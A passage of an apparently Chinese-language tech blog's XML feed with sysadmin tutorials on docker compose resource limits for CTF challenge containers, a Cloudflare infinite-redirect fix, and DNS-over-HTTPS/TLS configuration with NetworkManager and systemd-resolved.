ethtool -K eno1 tso off<br>#---<br></code></pre></td></tr></table></figure><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://serverfault.com/questions/249080/linux-e1000e-intel-networking-driver-problem-with-resume-and-pcie-off">ubuntu 10.10 - Linux e1000e (Intel networking driver) problem with resume and pcie=off - Server Fault</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://bugzilla.kernel.org/show_bug.cgi?id=118721f">118721 – e1000e hardware unit hangs when TSO is on</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://forum.proxmox.com/threads/e1000e-eno1-detected-hardware-unit-hang.59928/">e1000e eno1: Detected Hardware Unit Hang: | Proxmox Support Forum</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://forum.proxmox.com/threads/e1000-driver-hang.58284/">e1000 driver hang | Proxmox Support Forum</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>疑難雜症</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>server</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何在docker compose file中限制系統資源的使用</title>
    <link href="/docker-compose-file-limit-resource/"/>
    <url>/docker-compose-file-limit-resource/</url>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>這也算是在舉辦 TSCCTF 中整理的一些資訊，因為題目都是放在docker container中跑，為了避免題目被打穿佔用資源影響到其他題目的正常運作，所以當時幫出題人員整理了一下在docker compose  file中限制系統資源使用的方式。</p><p>不過現在docker中已經包含了compose組件，而compose組件吃的格式和<code>docker-compose</code>指令吃的格式有點不一樣，所以重新整理了這一篇文章。</p><h1 id="格式">格式</h1>    <div class="fold">      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-631c5d3e" role="button" aria-expanded="false" aria-controls="collapse-631c5d3e">        <div class="fold-arrow">▶</div>docker-compose version 2、3中限制的方法      </div>      <div class="fold-collapse collapse" id="collapse-631c5d3e">        <div class="fold-content">          <p>這兩種格式已經被棄用<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Legacy versions | Docker Docs](https://docs.docker.com/compose/compose-file/legacy-versions)">[1]</span></a></sup></p><h2 id="version-2">version 2</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;2&quot;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">service_name:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">image_name</span><br>    <br>    <span class="hljs-comment">## 若沒有寫入的需求請一律使用read_only，volume也請使用ro掛載</span><br>    <span class="hljs-attr">read_only:</span> <span class="hljs-literal">true</span><br>    <br>    <span class="hljs-comment">## 若有寫入需求請註解掉read_only，改用以下兩行限制rootfs size</span><br>    <span class="hljs-comment">## 此選項只支援部分storage driver，在overlay2中只支援xfs</span><br>    <span class="hljs-comment">## https://docs.docker.com/reference/cli/docker/container/run/#storage-opt</span><br>    <span class="hljs-comment"># storage_opt:</span><br>      <span class="hljs-comment"># size: 1G</span><br>      <br>    <span class="hljs-comment">## 可使用的cpu數</span><br>    <span class="hljs-attr">cpus:</span> <span class="hljs-number">1</span><br>    <br>    <span class="hljs-comment">## 優先級，可不設定</span><br>    <span class="hljs-comment">## 可以理解為在資源不足時，容器搶資源的能力，按照cpu_share的比例來分資源，預設為1024</span><br>    <span class="hljs-comment"># cpu_shares: 1024</span><br>    <br>    <span class="hljs-comment">## 限制memory大小，視個別情況決定限制的大小</span><br>    <span class="hljs-attr">mem_limit:</span> <span class="hljs-string">1G</span><br>    <br>    <span class="hljs-comment">## 資源不足時啟用的限制，可不設定</span><br>    <span class="hljs-comment"># mem_reservation: 128M</span><br></code></pre></td></tr></table></figure><h2 id="version3">version3</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">## 請使用3.7以上</span><br><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;3.7&quot;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">service_name:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">image_name</span><br>    <br>    <span class="hljs-comment">## 若沒有寫入的需求請一律使用read_only，volume也請使用ro掛載</span><br>    <span class="hljs-attr">read_only:</span> <span class="hljs-literal">true</span><br>    <br>    <span class="hljs-comment">## 若有寫入需求請註解掉read_only，改用以下兩行限制rootfs size</span><br>    <span class="hljs-comment">## 此選項只支援部分storage driver，在overlay2中只支援xfs</span><br>    <span class="hljs-comment">## https://docs.docker.com/reference/cli/docker/container/run/#storage-opt</span><br>    <span class="hljs-comment"># storage_opt:</span><br>      <span class="hljs-comment"># size: 1G</span><br>      <br>    <span class="hljs-attr">deploy:</span><br>      <span class="hljs-attr">resources:</span><br>        <span class="hljs-attr">limits:</span><br>          <span class="hljs-comment">## 可使用的cpu數，可以設定為小數</span><br>          <span class="hljs-attr">cpus:</span> <span class="hljs-string">&#x27;1&#x27;</span><br>          <span class="hljs-comment">## 限制memory大小，視個別情況決定限制的大小</span><br>          <span class="hljs-attr">memory:</span> <span class="hljs-string">1G</span><br><br>        <span class="hljs-comment">## 資源不足時啟用的限制，可不設定</span><br>        <span class="hljs-comment"># reservations:</span><br>          <span class="hljs-comment"># cpus: &#x27;0.5&#x27;</span><br>          <span class="hljs-comment"># memory: 128M</span><br></code></pre></td></tr></table></figure><p>docker-compose v3下必須在<code>docker-compose</code>後加上參數啟動</p><p><code>docker-compose --compatibility up -d</code></p><p>其實也可以用<code>docker stack deploy --compose-file docker-compose.yml stack_name</code>來deploy，但是必須先初始化docker stack</p>        </div>      </div>    </div><h2 id="compose組件">compose組件</h2><p>這個版本的compose格式應該會是現行的版本，這部份參考自docker官網的文檔<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[Services top-level elements | Docker Docs](https://docs.docker.com/compose/compose-file/05-services)">[2]</span></a></sup></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">service_name:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">image_name</span><br>    <br>    <span class="hljs-comment">## 若沒有寫入的需求請一律使用read_only，volume也請使用ro掛載</span><br>    <span class="hljs-attr">read_only:</span> <span class="hljs-literal">true</span><br>    <br>    <span class="hljs-comment">## 若有寫入需求請註解掉read_only，改用以下兩行限制rootfs size</span><br>    <span class="hljs-comment">#storage_opt:</span><br>      <span class="hljs-comment">#size: 1G</span><br>      <br>    <span class="hljs-comment">## 可使用的cpu數(還有很多其他的限制種類，可以在參考中查看)</span><br>    <span class="hljs-attr">cpus:</span> <span class="hljs-number">1</span><br>    <br>    <span class="hljs-comment">## 優先級，可不設定</span><br>    <span class="hljs-comment">#cpu_shares: 1024</span><br>    <br>    <span class="hljs-comment">## 限制memory大小，視個別情況決定限制的大小</span><br>    <span class="hljs-attr">mem_limit:</span> <span class="hljs-string">1G</span><br>    <br>    <span class="hljs-comment">## 資源不足時啟用的限制，可不設定</span><br>    <span class="hljs-comment">#mem_reservation: 128M</span><br></code></pre></td></tr></table></figure><p>這個版本的格式不再需要指定<code>version</code>，使用<code>docker compose -f compose.yml up -d</code>啟動(如果在<code>compose.yml</code>的目錄可以不加<code>-f</code>)</p><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://docs.docker.com/compose/compose-file/legacy-versions">Legacy versions | Docker Docs</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://docs.docker.com/compose/compose-file/05-services">Services top-level elements | Docker Docs</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://www.baeldung.com/ops/docker-memory-limit">Setting Memory And CPU Limits In Docker | Baeldung on Ops</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://blog.yowko.com/docker-compose-3-cpu-memory-limit/">在 Docker Compose file 3 下限制 CPU 與 Memory - Yowko’s Notes</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://stackoverflow.com/questions/42345235/how-to-specify-memory-cpu-limit-in-docker-compose-version-3">How to specify Memory &amp; CPU limit in docker compose version 3 - Stack Overflow</a><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><a href="https://stackoverflow.com/questions/36145817/how-to-limit-io-speed-in-docker-and-share-file-with-system-in-the-same-time">How to limit IO speed in docker and share file with system in the same time? - Stack Overflow</a><a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:7" class="footnote-text"><span><a href="https://stackoverflow.com/questions/19158810/docker-mount-volumes-as-readonly">Docker, mount volumes as readonly - Stack Overflow</a><a href="#fnref:7" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>server</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cloudflare Proxy 無限301轉址</title>
    <link href="/cloudflare-infinite-301-redirection/"/>
    <url>/cloudflare-infinite-301-redirection/</url>
    
    <content type="html"><![CDATA[<h1 id="前情提要">前情提要</h1><p>我記得這是在架設TSCCTF 2024網站時發生的，時間距離現在有點久了，細節有點忘了，只是這個錯誤的發生還挺有意思就拿來記錄一下。</p><h1 id="症狀">症狀</h1><p>在開啟Cloudflare Proxy的狀況下，連接網站時會發生如圖的無限301轉址迴圈，最後因為跳轉過多而停止。</p><p><img src="infinite301.png" alt=""></p><h1 id="發生原因">發生原因</h1><p>這是因為在Cloudflare的Proxy設定中選擇了Flexble，而且同時後端服務器監聽的http會返回301轉址到https造成的（也就是在沒有Proxy的情況下連到http會自動使用https連線）。</p><p><img src="ssl_policy.png" alt=""></p><p>因為後端返回的return to https一樣會由Cloudflare Proxy處理，再次去訪問後端的http，然後再次返回301造成無限迴圈</p><p><img src="why_infinite301.png" alt=""></p><h1 id="解決">解決</h1><p>只需要將Cloudflare的Proxy設定成Full即可，或是將後端服務器的http改成呈現網頁內容</p><p><img src="ssl_policy_full.png" alt=""></p><p><img src="solve_infinite301.png" alt=""></p><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://community.cloudflare.com/t/possible-bug-http-redirect-loop-when-dns-is-proxied/206612">Possible bug - HTTP redirect loop when DNS is proxied - Website, Application, Performance / Security - Cloudflare Community</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://stackoverflow.com/questions/4616521/nginx-configuration-leads-to-endless-redirect-loop">ssl - Nginx configuration leads to endless redirect loop - Stack Overflow</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
      <category>疑難雜症</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>server</tag>
      
      <tag>cloudflare</tag>
      
      <tag>https</tag>
      
      <tag>301-redirection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DoH、DoT、Networkmanager與systemd-resolved的設定</title>
    <link href="/doh-dot-networkmanager-and-systemd-resolved/"/>
    <url>/doh-dot-networkmanager-and-systemd-resolved/</url>
    
    <content type="html"><![CDATA[<div class="note note-info">            <p>2024/6/9更新： 有關Networkmanager的自動化腳本</p>          </div><h1 id="前言">前言</h1><p>一開始只是想給在用的筆電加上DNS over HTTPS或是DNS over Tls而已，後來又逐漸冒出很多奇怪(?)的需求，因此稍微研究了一下linux 上的DNS管理機制。</p><h1 id="需求">需求</h1><p>首先是DNS使用DNS over HTTPS/DNS over Tls，但是在特定的網路連接下會自動切換成對應的DNS，忽略不信任網路下DHCP提供的DNS。</p><h1 id="實現">實現</h1><h2 id="DNS-over-HTTPS-sup-id-fnref-1-class-footnote-ref-a-href-fn-1-rel-footnote-span-class-hint-top-hint-rounded-aria-label-DNS-over-HTTPS-ArchWiki-https-wiki-archlinux-org-title-DNS-over-HTTPS-1-span-a-sup">DNS over HTTPS<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="[DNS-over-HTTPS - ArchWiki](https://wiki.archlinux.org/title/DNS-over-HTTPS)">[1]</span></a></sup></h2><p>這個算是最簡單的一項了，基本只要照著ArchWiki的操作執行就好</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">確認沒有端口使用localhost:53</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">ss -lp <span class="hljs-string">&#x27;sport = :domain&#x27;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">安裝dns-over-https</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo pacman -S dns-over-https</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">啟動dns-over-https服務</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now doh-client.service</span><br></code></pre></td></tr></table></figure><p>設定檔在<code>/etc/dns-over-https/doh-client.conf</code>但是基本不用更改，預設的DoH server就是Cloudflare的</p><p>接著只要將DNS server改成<code>127.0.0.1</code>就完成DNS over HTTPS的設定了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;nameserver 127.0.0.1&#x27;</span> &gt; /etc/resolv.conf</span><br></code></pre></td></tr></table></figure><h2 id="Network-manager">Network manager</h2><p>但是這樣就會出現一個問題，Network manager在連上一個新的網路時，如果IP是設定使用DHCP，而非DHCP(Address only)或是其他選項的話，啟動連接時將會將新的nameserver寫入<code>/etc/resolv.conf</code>覆蓋。</p><p><img src="networkmanager_ipv4_setting.png" alt=""></p><p>不過在查看<code>NetworkManager.conf(5)</code>後可以發現，Network manager只會在<code>/etc/NetworkManager/NetworkManager.conf</code>中沒有設定<code>dns</code>這個選項或是設定成<code>dns=default</code>時且<code>/etc/resolv.conf</code>為一般的文件而非連結檔，才會修改<code>/etc/resolv.conf</code>。</p><p>讀到這裡，其實就可以知道怎麼解決問題了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;nameserver 127.0.0.1&#x27;</span> &gt; /etc/resolv-manual.conf</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ln</span> -sf /etc/resolv-manual.conf /etc/resolv.conf</span><br></code></pre></td></tr></table></figure><p><s>當然你也可以用<code>chattr</code>給<code>/etc/resolv.conf</code>指定不可寫入的屬性，不過這樣設定就有點僵硬了</s></p>    <div class="fold">      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-9fb3859f" role="button" aria-expanded="false" aria-controls="collapse-9fb3859f">        <div class="fold-arrow">▶</div>Network manager的一些其他行為      </div>      <div class="fold-collapse collapse" id="collapse-9fb3859f">        <div class="fold-content">          <p>如果<code>dns</code>選項沒有指定值的話，那麼預設是會使用<code>default</code>，除非<code>/etc/resolv.conf</code>是個連結到</p><p><code>/run/systemd/resolve/stub-resolv.conf, /run/systemd/resolve/resolv.conf, /lib/systemd/resolv.conf, /usr/lib/systemd/resolv.conf</code>的連結檔，這時<code>dns</code>選項會使用<code>systemd-resolved</code>，如果<code>/etc/resolv.conf</code>是個連結到其他地方的連接檔，那麼則是會使用<code>dns=none</code></p>        </div>      </div>    </div><h2 id="systemd-resolved-sup-id-fnref-2-class-footnote-ref-a-href-fn-2-rel-footnote-span-class-hint-top-hint-rounded-aria-label-systemd-resolved-ArchWiki-https-wiki-archlinux-org-title-Systemd-resolved-DNS-over-TLS-2-span-a-sup">systemd-resolved<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[systemd-resolved - ArchWiki](https://wiki.archlinux.org/title/Systemd-resolved#DNS_over_TLS)">[2]</span></a></sup></h2><p>不過這樣設定的話就會造成一個問題，雖然連接的網路是什麼不會影響DNS server的選擇了，但也永遠釘死在<code>127.0.0.1</code>的DNS over HTTPS上，除非手動修改，但是需求之一就是Network manager在切換連接時可以自動修改DNS，而非每次都要手動修改。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">開啟systemd-resolved，會與resolvconf衝突</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">systemctl <span class="hljs-built_in">enable</span> --now systemd-resolved</span><br></code></pre></td></tr></table></figure><p>systemd-resolved會提供部分<code>resolvconf</code>的功能，同時，啟用後會提供<code>resolvectl</code>。</p><p>在啟用服務後會在<code>127.0.0.53</code>和<code>127.0.0.54</code>上開啟DNS服務，當訪問systemd-resolved的DNS server時，則是會使用在<code>/etc/systemd/resolved.conf</code>設定的DNS服務器和自身緩存做解析。</p>    <div class="fold">      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-dc5be6dc" role="button" aria-expanded="false" aria-controls="collapse-dc5be6dc">        <div class="fold-arrow">▶</div>systemd-resolved的四種模式      </div>      <div class="fold-collapse collapse" id="collapse-dc5be6dc">        <div class="fold-content">          <p>systemd-resolved有四種模式stub、static、uplink、foreign，這取決於<code>/etc/resolv.conf</code>的狀態</p><p>如果<code>/etc/resolv.conf</code>是連結到<code>/run/systemd/resolve/stub-resolv.conf</code>，那麼systemd-resolved就會是stub模式</p><p>如果<code>/etc/resolv.conf</code>是連結到<code>/lib/systemd/resolv.conf, /usr/lib/systemd/resolv.conf</code>，那麼systemd-resolved就會是static模式</p><p>如果<code>/etc/resolv.conf</code>是連結到<code>/run/systemd/resolve/stub-resolv.conf</code>，那麼systemd-resolved就會是uplink模式</p><p>如果<code>/etc/resolv.conf</code>是一般檔案或是連接到其他地方，那麼systemd-resolved就會是foreign模式</p><p>這些檔案的內容有興趣可以去翻翻看，不過推薦是使用stub模式</p>        </div>      </div>    </div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">使用stub模式</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ln</span> -sf /run/systemd/resolve/stub-resolv.conf /etc/resolv.conf</span><br></code></pre></td></tr></table></figure><p>這個時候使用<code>resolvectl status</code>就可以看到在stub模式了</p><p>這樣目前的設定就是<code>/etc/resolv.conf</code> -&gt; <code>/run/systemd/resolve/stub-resolv.conf</code>，內容應該是<code>nameserver 127.0.0.53</code>然後底下有一些其他選項。</p><p>systemd-resolved會根據DNS Domain決定DNS request要往哪個DNS server詢問，如果沒有設定DNS Domain則是使用預設，也就是<code>/etc/systemd/resolved.conf</code>裡設定的</p><p>這樣只要在Network Manager設定DNS Domain為<code>~.</code>或是想要解析的內部域名，在連上網路時會反映到systemd-resolved上，就可以使用特定的DNS了</p><h3 id="設定">設定</h3><p>修改<code>/etc/systemd/resolved.conf</code>設定檔</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs conf">[Resolve]<br># 上游使用前面設定的DoH server<br>DNS=127.0.0.1<br></code></pre></td></tr></table></figure><p>目前系統訪問DNS的實際流程就會是 <code>/etc/resolv.conf</code> -&gt; <code>127.0.0.53:53</code> -&gt; <code>127.0.0.1:53</code> -&gt; <code>https://cloudflare-dns.com/dns-query</code>，但是這樣感覺有點太複雜了，如果只是想要加密DNS，那麼DoT也可達成，而且systemd-resolved支援DoT。</p><h2 id="DNS-over-Tls-sup-id-fnref-2-class-footnote-ref-a-href-fn-2-rel-footnote-span-class-hint-top-hint-rounded-aria-label-systemd-resolved-ArchWiki-https-wiki-archlinux-org-title-Systemd-resolved-DNS-over-TLS-2-span-a-sup">DNS over Tls<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="[systemd-resolved - ArchWiki](https://wiki.archlinux.org/title/Systemd-resolved#DNS_over_TLS)">[2]</span></a></sup></h2><p>只需要修改<code>/etc/systemd/resolved.conf</code>即可完成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs conf">[Resolve]<br># 使用Cloudflare的DNS<br>DNS=1.1.1.1<br># 如果DNSOverTLS設定為on的話，如果你想使用的其他DNS不支援DoT，那麼systemd-resolved將不會發出詢問<br># 使用opportunistic則是會在上游支援時使用，如果不支援則使用原本模式<br>DNSOverTLS=opportunistic<br></code></pre></td></tr></table></figure><p>那麼系統訪問DNS的實際流程就會變為 <code>/etc/resolv.conf</code> -&gt; <code>127.0.0.53:53</code> -&gt; <code>1.1.1.1:853</code>，減少了一個流程，結構變得簡單不少</p><h2 id="Networkmanager-的自動化腳本">Networkmanager 的自動化腳本</h2><p>前面有提到設定DNS domain為<code>~.</code>可以讓網路介面的DNS server成為全域DNS，但是在接上VPN時，不知道為什麼systemd-resolve會不吃DNS domain設定為<code>~.</code>的網路介面的資訊，<code>resolvectl</code>直接顯示這個介面沒有DNS資訊。</p><p>於是我就換了一種方法來實現，介面的DNS domain可以設定為其他值，或不設定，而是在啟動任何介面時檢查我想要更改DNS domain的介面是否開啟，如果開啟就直接調用<code>resolvectl</code>來更改設定。</p><p>設定只需要編輯一個檔案<code>/etc/NetworkManager/dispatcher.d/set_&lt;interface&gt;_dns_domain.sh</code>，並給他加上執行權限<code>chmod +x /etc/NetworkManager/dispatcher.d/set_&lt;interface&gt;_dns_domain.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><br><span class="hljs-keyword">if</span> nmcli connection show <span class="hljs-string">&quot;&lt;connection name&gt;&quot;</span> | grep <span class="hljs-string">&#x27;GENERAL.STATE&#x27;</span>; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;change &lt;interface name&gt; dns domain&quot;</span><br>    resolvectl domain &lt;interface name&gt; <span class="hljs-string">&#x27;~.&#x27;</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p><code>&lt;connection name&gt;</code>為Networkmanager中連線的名字，<code>&lt;interface name&gt;</code>則是網路介面的名字。</p><p>Networkmanager的自動化腳本也可以做更多其他的事，像是偵測到物理連接斷開後自動開啟無線網路<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="[用 NM-dispatcher 实现 WiFi 开关的自动控制 - sbw Blog](https://blog.sbw.so/u/nm-dispatcher-auto-switch-between-wifi-ethernet.html)">[3]</span></a></sup>。</p><h2 id="總結">總結</h2><p>其實這樣做還是會有一個漏洞，如果你不信任的DHCP server有設定DNS domain，那麼systemd-resolved一樣會吃到這個設定，解決的方法就是把Network Manager的那個網路連接設定為使用DHCP(Address only)，但是這樣就要手動設定，有點不爽。</p><p>最後總結：如果你真的在一個不信任的網路環境中，那麼我還是推薦你使用VPN吧，這篇的DNS設定其實幫不了你多少忙。</p><h2 id="同場加映-–-nsswitch">同場加映 – nsswitch</h2><p>全名是name service switch configuration，簡單來說就是配置系統在查詢各項東西的時候要去哪裡查，像是passwd就是用戶驗證，設定為使用檔案(也就是/etc/passwd)，或者是使用systemd驗證，如果想要串LDAP之類的身分驗證，那麼就要在後面加上對應的Plugin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs conf">passwd: files systemd<br>group: files [SUCCESS=merge] systemd<br>shadow: files systemd<br>gshadow: files systemd<br><br>publickey: files<br><br>hosts: mymachines resolve [!UNAVAIL=return] files myhostname dns<br>networks: files<br><br>protocols: files<br>services: files<br>ethers: files<br>rpc: files<br><br>netgroup: files<br></code></pre></td></tr></table></figure><p>其中的<code>hosts</code>選項就是要怎麼解析domain的設定，<code>mymachines</code>是檢查內部容器或虛擬機有沒有對應的域名，resolve是systemd-resolved，除非systemd-resolved無法使用才會進入下一個選項(<code>[!UNAVAIL=return]</code>，有四種狀態，有興趣可以去看<code>nsswitch.conf(5)</code>)，files是<code>/etc/hosts</code>，myhostname是本機的hostname，最後dns就是按照<code>/etc/resolv.conf</code>的設定去查詢。</p><h2 id="參考">參考</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://wiki.archlinux.org/title/DNS-over-HTTPS">DNS-over-HTTPS - ArchWiki</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://wiki.archlinux.org/title/Systemd-resolved#DNS_over_TLS">systemd-resolved - ArchWiki</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://blog.sbw.so/u/nm-dispatcher-auto-switch-between-wifi-ethernet.html">用 NM-dispatcher 实现 WiFi 开关的自动控制 - sbw Blog</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>教程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>linux</tag>
      
      <tag>dns</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Asus X99 通病</title>
    <link href="/asus-x99-code-00/"/>
    <url>/asus-x99-code-00/</url>
    
